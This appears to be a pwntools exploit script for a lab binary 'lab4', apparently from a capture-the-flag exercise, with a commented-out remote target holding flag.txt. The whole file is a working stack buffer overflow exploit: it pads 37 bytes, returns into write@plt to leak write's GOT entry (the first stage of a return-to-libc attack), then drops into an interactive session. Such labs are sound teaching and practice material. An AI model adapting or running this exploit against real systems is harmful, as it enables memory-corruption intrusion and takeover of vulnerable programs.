#!/usr/bin/python3

from pwn import *

# target: flag.txt @ 147.182.223.56:7777

write_plt = p32(0x08049066)
write_got = p32(0x804c018)

def main():
    # p = remote("147.182.223.56", 7777)

    p = process("./lab4")

    # create your payload
    payload = b"A"*37
    payload += write_plt
    payload += p32(0xdeadbeef)
    payload += p32(1) + write_got + p32(4)

    p.send(payload)

    p.recv(72)
    data = p.recv(4)
    log.info("leak data: %s\n", data)

    # Change to interactive mode
    p.interactive()


if __name__ == "__main__":
    main()